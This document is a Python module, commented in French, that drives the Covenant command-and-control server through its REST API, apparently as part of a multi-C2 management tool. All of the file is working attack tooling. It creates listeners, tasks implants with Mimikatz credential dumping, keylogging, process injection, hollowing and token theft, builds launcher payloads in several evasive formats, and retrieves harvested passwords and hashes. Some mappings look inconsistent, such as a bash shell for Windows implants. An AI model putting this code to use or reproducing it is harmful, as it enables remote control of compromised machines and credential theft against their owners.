"""
Covenant C2 — REST API complète.

Covenant est un C2 .NET (port 7443 HTTPS par défaut).
Auth      : JWT via POST /api/users/login
Swagger   : https://host:7443/swagger/index.html

Endpoints clés :
  POST /api/users/login           → login → JWT token
  GET  /api/grunts                → liste des Grunts (agents)
  GET  /api/grunts/{id}           → détail grunt
  GET  /api/listeners             → liste des listeners
  POST /api/httplisteners         → créer HTTP listener
  POST /api/httpslisteners        → créer HTTPS listener
  POST /api/bridgelisteners       → créer Bridge listener
  DELETE /api/listeners/{id}      → supprimer listener
  GET  /api/grunts/{id}/taskings  → historique des tasks
  POST /api/grunts/{id}/taskings  → envoyer une task
  GET  /api/launchers             → liste launchers disponibles
  POST /api/launchers/binary      → générer launcher binaire
  POST /api/launchers/powershell  → générer launcher PowerShell
  POST /api/launchers/msbuild     → générer launcher MSBuild
  GET  /api/credentials           → credentials enregistrés
  GET  /api/indicators/targets    → cibles/targets

Statuts Grunt : Uninitialized, Connected, Active, Lost, Exited, Disconnected
Types de task : ShellCmd, PowerShell, Assembly, Upload, Download,
                ScreenShot, WhoAmI, ProcessList, Mimikatz, ...
"""
from __future__ import annotations

import asyncio
import logging
import uuid
from datetime import datetime
from typing import Any

import httpx

from c2_manager.interfaces import RestC2Interface, C2AuthError
from c2_manager.models import C2Config, C2Status, Listener, Implant, Task, PayloadConfig

logger = logging.getLogger(__name__)

_ACTIVE_STATUSES = {"Connected", "Active"}
_GRUNT_TO_INTEGRITY = {
    "SYSTEM":       "SYSTEM",
    "ADMINISTRATOR": "ADMIN",
    "ADMIN":        "ADMIN",
    "USER":         "USER",
}


class CovenantC2(RestC2Interface):
    """
    Covenant .NET C2 — REST API JWT.

    Paramètres supplémentaires (config.extra) :
      verify_ssl : bool  (défaut: False — Covenant utilise un cert auto-signé)
    """

    CAPABILITIES = [
        "list_agents", "send_task", "create_listener", "remove_listener",
        "generate_payload", "list_launchers", "get_credentials",
        "assembly_exec", "powershell_exec", "mimikatz", "screenshot",
        "process_list", "file_download", "file_upload", "whoami",
    ]

    # ── Auth ─────────────────────────────────────────────────────────────────

    async def _authenticate(self, config: C2Config) -> str:
        """
        Covenant utilise POST /api/users/login avec JSON body.
        Renvoie un access_token JWT.
        """
        async with httpx.AsyncClient(
            base_url=config.base_url,
            verify=config.extra.get("verify_ssl", False),
            timeout=15.0,
        ) as client:
            resp = await client.post(
                "/api/users/login",
                json={
                    "UserName": config.username or "Admin",
                    "Password": config.password or "",
                },
            )
            if resp.status_code not in (200, 201):
                raise C2AuthError(
                    f"Covenant auth échouée [{resp.status_code}]: {resp.text[:300]}"
                )
            data = resp.json()
            token = data.get("covenantToken") or data.get("token") or data.get("access_token")
            if not token:
                raise C2AuthError(f"Token Covenant absent dans la réponse : {data}")
            logger.info("Covenant : authentifié (token %s…)", token[:16])
            return token

    async def get_status(self) -> C2Status:
        if not self._client:
            return C2Status.DISCONNECTED
        try:
            resp = await self._client.get("/api/grunts", timeout=5.0)
            return C2Status.CONNECTED if resp.status_code == 200 else C2Status.ERROR
        except Exception:
            return C2Status.ERROR

    # ── Listeners ────────────────────────────────────────────────────────────

    async def create_listener(self, config: dict[str, Any]) -> Listener:
        self._require_connected()
        protocol = config.get("protocol", "http").lower()
        host     = config.get("bind_host", "0.0.0.0")
        port     = int(config.get("bind_port", 80))
        name     = config.get("name", f"covenant-{protocol}-{port}")

        # Covenant sépare les endpoints HTTP/HTTPS/Bridge
        endpoint_map = {
            "http":   "/api/httplisteners",
            "https":  "/api/httpslisteners",
            "bridge": "/api/bridgelisteners",
        }
        endpoint = endpoint_map.get(protocol, "/api/httplisteners")

        # Body commun pour HTTP/HTTPS listeners
        body: dict[str, Any] = {
            "Name":              name,
            "ListenerType":     {"Name": protocol.upper()},
            "BindAddress":      host,
            "BindPort":         port,
            "ConnectAddresses": [config.get("callback_host", host)],
            "ConnectPort":      port,
            "UseSSL":           protocol == "https",
            "SslCertificatePassword": config.get("ssl_password", "covenant"),
            "ProfileId":        config.get("profile_id", 2),  # DefaultHttpProfile
            "StartDate":        datetime.utcnow().isoformat(),
        }

        if protocol == "bridge":
            body.update({
                "ImplantTemplate": config.get("implant_template", "Covenant"),
            })

        data = await self._post(endpoint, json=body)
        listener_id = str(data.get("id", uuid.uuid4()))
        status_raw  = str(data.get("status", "Active")).lower()
        status = "running" if status_raw in ("active", "listening") else "stopped"

        return Listener(
            id=listener_id,
            name=data.get("name", name),
            c2_type=self._config.c2_type,
            bind_host=host,
            bind_port=port,
            protocol=protocol,
            status=status,
            meta={
                "profile_id":    data.get("profileId"),
                "connect_addrs": data.get("connectAddresses", []),
            },
        )

    async def remove_listener(self, listener_id: str) -> bool:
        self._require_connected()
        try:
            await self._delete(f"/api/listeners/{listener_id}")
            return True
        except Exception as exc:
            logger.error("Covenant remove_listener échoué : %s", exc)
            return False

    async def list_listeners(self) -> list[Listener]:
        self._require_connected()
        data  = await self._get("/api/listeners")
        items = data if isinstance(data, list) else data.get("items", [])
        result: list[Listener] = []
        for item in items:
            lt       = item.get("listenerType", {})
            proto    = (lt.get("name") or "HTTP").lower()
            status   = "running" if item.get("status") in ("Active", "Listening") else "stopped"
            result.append(Listener(
                id=str(item.get("id", uuid.uuid4())),
                name=item.get("name", ""),
                c2_type=self._config.c2_type,
                bind_host=item.get("bindAddress", "0.0.0.0"),
                bind_port=int(item.get("bindPort", 80)),
                protocol=proto,
                status=status,
                meta={
                    "connect_addrs": item.get("connectAddresses", []),
                    "profile_id":    item.get("profileId"),
                },
            ))
        return result

    # ── Grunts (agents) ──────────────────────────────────────────────────────

    async def list_agents(self) -> list[Implant]:
        self._require_connected()
        data  = await self._get("/api/grunts")
        items = data if isinstance(data, list) else data.get("items", [])
        return [self._parse_grunt(g) for g in items]

    def _parse_grunt(self, g: dict[str, Any]) -> Implant:
        gid = str(g.get("id", uuid.uuid4()))

        # Timestamps ISO
        def _dt(v: str | None) -> datetime:
            if not v:
                return datetime.utcnow()
            for fmt in ("%Y-%m-%dT%H:%M:%S.%fZ", "%Y-%m-%dT%H:%M:%SZ",
                        "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S"):
                try:
                    return datetime.strptime(v[:26], fmt)
                except ValueError:
                    continue
            return datetime.utcnow()

        status_str = g.get("status", "Active")
        active     = status_str in _ACTIVE_STATUSES

        # Integrity : Covenant stocke dans "integrity" (int) ou "integrityLevel"
        integrity_raw = str(
            g.get("integrityLevel") or g.get("integrity") or "USER"
        ).upper()
        integrity = _GRUNT_TO_INTEGRITY.get(integrity_raw, "USER")
        # Si intégrité est un entier (0=Untrusted,1=Low,2=Medium,3=High,4=System)
        if integrity_raw.isdigit():
            level = int(integrity_raw)
            integrity = {4: "SYSTEM", 3: "ADMIN", 2: "USER", 1: "USER", 0: "USER"}.get(level, "USER")

        listener_id = ""
        if "listenerId" in g:
            listener_id = str(g["listenerId"])
        elif isinstance(g.get("listener"), dict):
            listener_id = str(g["listener"].get("id", ""))

        return Implant(
            id=gid,
            name=g.get("name") or gid,
            c2_type=self._config.c2_type,
            listener_id=listener_id,
            external_ip=g.get("remoteIPAddress", ""),
            internal_ip=g.get("ipAddress", ""),
            hostname=g.get("hostname", ""),
            username=g.get("userName", ""),
            os="{} {}".format(g.get("operatingSystem", ""), g.get("dotNetVersion", "")).strip(),
            arch=g.get("architecture", ""),
            pid=int(g.get("processId", 0)),
            process_name=g.get("processName", ""),
            integrity=integrity,
            last_checkin=_dt(g.get("lastCheckIn") or g.get("activationTime")),
            first_seen=_dt(g.get("activationTime") or g.get("killDate")),
            active=active,
            meta={
                "status":      status_str,
                "delay":       g.get("delay", 5),
                "jitter":      g.get("jitter", 0),
                "kill_date":   g.get("killDate"),
                "grunt_key":   g.get("gruntSharedSecretPassword", "")[:8] + "…",
            },
        )

    # ── Tâches ───────────────────────────────────────────────────────────────

    # Mapping type court → nom de task Covenant
    _TASK_TYPE_MAP: dict[str, str] = {
        "shell":       "ShellCmd",
        "cmd":         "ShellCmd",
        "ps":          "PowerShell",
        "powershell":  "PowerShell",
        "assembly":    "Assembly",
        "upload":      "Upload",
        "download":    "Download",
        "screenshot":  "ScreenShot",
        "whoami":      "WhoAmI",
        "processlist": "ProcessList",
        "proc":        "ProcessList",
        "mimikatz":    "Mimikatz",
        "logonpasswords": "Mimikatz",
        "ls":          "ListDirectory",
        "cd":          "ChangeDirectory",
        "mkdir":       "MakeDirectory",
        "rm":          "Delete",
        "cp":          "Copy",
        "mv":          "Move",
        "cat":         "ReadTextFile",
        "env":         "GetRegistryKey",
        "inject":      "Inject",
        "hollow":      "Hollow",
        "sleep":       "SetDelay",
        "jitter":      "SetJitter",
        "kill":        "Kill",
        "exit":        "Exit",
        "jobkill":     "TaskKill",
        "token":       "MakeToken",
        "rev2self":    "Rev2Self",
        "runasuser":   "RunAs",
        "keylog":      "KeyLog",
        "history":     "History",
        "portscan":    "PortScan",
        "ping":        "Ping",
    }

    async def send_task(
        self,
        agent_id:  str,
        command:   str,
        args:      list[str] | None = None,
    ) -> Task:
        self._require_connected()
        args_list  = args or []
        cmd_parts  = command.split()
        cmd_lower  = cmd_parts[0].lower() if cmd_parts else "shell"
        task_name  = self._TASK_TYPE_MAP.get(cmd_lower, "ShellCmd")
        extra_args = cmd_parts[1:] + args_list

        # Paramètres selon le type de task
        params: dict[str, Any]
        if task_name == "ShellCmd":
            shell_cmd = " ".join([command] + args_list) if not args_list else command + " " + " ".join(args_list)
            params = {
                "ShellCommand":     shell_cmd,
                "Shell":            "/bin/bash",
                "RunAsAdministrator": False,
            }
        elif task_name == "PowerShell":
            ps_cmd = " ".join(extra_args) if extra_args else command.replace("ps ", "", 1)
            params = {
                "PowerShellCommand": ps_cmd,
                "RunAsAdministrator": False,
            }
        elif task_name in ("Assembly", "Inject", "Hollow"):
            params = {
                "AssemblyName": extra_args[0] if extra_args else "assembly",
                "Parameters":   " ".join(extra_args[1:]) if len(extra_args) > 1 else "",
            }
        elif task_name in ("Upload", "Download"):
            params = {
                "FilePath":    extra_args[0] if extra_args else "",
                "FileContents": "",
            }
        elif task_name == "SetDelay":
            params = {"Delay": int(extra_args[0]) if extra_args else 5}
        elif task_name == "SetJitter":
            params = {"JitterPercent": int(extra_args[0]) if extra_args else 0}
        else:
            params = {"Parameters": " ".join(extra_args)}

        body = {
            "Type":       task_name,
            "Parameters": params,
            "GruntId":    int(agent_id) if agent_id.isdigit() else 0,
        }

        data = await self._post(
            f"/api/grunts/{agent_id}/taskings",
            json=body,
        )

        return Task(
            id=str(data.get("id", uuid.uuid4())),
            agent_id=agent_id,
            c2_type=str(self._config.c2_type),
            command=command,
            args=args_list,
            status=data.get("status", "Tasked"),
            meta={"task_type": task_name},
        )

    async def get_task_result(self, task_id: str) -> dict[str, Any]:
        self._require_connected()
        # Covenant : les résultats de task sont dans /api/grunts/{id}/taskings/{task_id}
        # On cherche d'abord en parcourant les taskings de tous les grunts
        parts = task_id.split("/")
        if len(parts) == 2:
            grunt_id, tid = parts
            data = await self._get(f"/api/grunts/{grunt_id}/taskings/{tid}")
        else:
            # Fallback : chercher dans l'historique
            data = await self._get(f"/api/taskings/{task_id}")
        return {
            "task_id": task_id,
            "status":  data.get("status"),
            "type":    data.get("type"),
            "result":  data.get("gruntTaskingOutput", {}).get("output", ""),
        }

    async def get_task_history(self, grunt_id: str) -> list[dict[str, Any]]:
        """Historique complet des taskings d'un Grunt."""
        self._require_connected()
        data  = await self._get(f"/api/grunts/{grunt_id}/taskings")
        items = data if isinstance(data, list) else data.get("items", [])
        return [
            {
                "id":      str(t.get("id")),
                "type":    t.get("type"),
                "status":  t.get("status"),
                "output":  t.get("gruntTaskingOutput", {}).get("output", ""),
                "time":    t.get("taskingTime"),
            }
            for t in items
        ]

    # ── Launchers / Payload ──────────────────────────────────────────────────

    async def generate_payload(self, config: PayloadConfig) -> bytes:
        self._require_connected()

        fmt_map = {
            "exe":        "binary",
            "binary":     "binary",
            "ps1":        "powershell",
            "powershell": "powershell",
            "msbuild":    "msbuild",
            "msi":        "msi",
            "wmic":       "wmic",
            "regsvr32":   "regsvr32",
            "installutil": "installutil",
        }
        launcher_type = config.extra.get("launcher_type", fmt_map.get(config.format, "binary"))
        endpoint      = f"/api/launchers/{launcher_type}"

        body: dict[str, Any] = {
            "ListenerId":  int(config.listener_id) if config.listener_id.isdigit() else 0,
            "ImplantTemplate": {"Name": "GruntHTTP"},
            "ValidateCert":    not config.extra.get("ignore_ssl", True),
            "UseCertPinning":  config.extra.get("cert_pinning", False),
            "SmbPipeName":     config.extra.get("smb_pipe", ""),
            "DotNetVersion":   config.extra.get("dotnet", "Net40"),
            "RuntimeIdentifier": "win-x64" if config.arch == "x64" else "win-x86",
            "Delay":           config.sleep,
            "JitterPercent":   config.jitter,
            "KillDate":        config.extra.get("kill_date", ""),
        }

        # Étape 1 : PUT pour configurer le launcher
        await self._put(endpoint, json=body)

        # Étape 2 : GET pour récupérer les bytes du launcher
        resp = await self._client.get(endpoint)
        if resp.status_code == 200:
            ct = resp.headers.get("content-type", "")
            if "application/octet-stream" in ct or "application/zip" in ct:
                return resp.content
            # Réponse JSON → récupérer le champ LauncherString
            data = resp.json()
            launcher_str = data.get("launcherString") or data.get("base64LauncherString", "")
            if launcher_str:
                import base64
                try:
                    return base64.b64decode(launcher_str)
                except Exception:
                    return launcher_str.encode()
        return b""

    async def list_launchers(self) -> list[dict[str, Any]]:
        """Liste les types de launchers disponibles."""
        self._require_connected()
        data  = await self._get("/api/launchers")
        items = data if isinstance(data, list) else data.get("items", [])
        return [
            {
                "type":         l.get("type", ""),
                "listener_id":  l.get("listenerId"),
                "dotnet":       l.get("dotNetVersion"),
                "delay":        l.get("delay"),
            }
            for l in items
        ]

    # ── Credentials ──────────────────────────────────────────────────────────

    async def get_credentials(self) -> list[dict[str, Any]]:
        """Récupère les credentials enregistrés dans Covenant."""
        self._require_connected()
        data  = await self._get("/api/credentials")
        items = data if isinstance(data, list) else data.get("items", [])
        return [
            {
                "id":       str(c.get("id")),
                "type":     c.get("type", "password"),
                "domain":   c.get("domain", ""),
                "username": c.get("username", ""),
                "password": c.get("password", ""),
                "hash":     c.get("hash", ""),
            }
            for c in items
        ]

    async def get_capabilities(self) -> list[str]:
        return self.CAPABILITIES
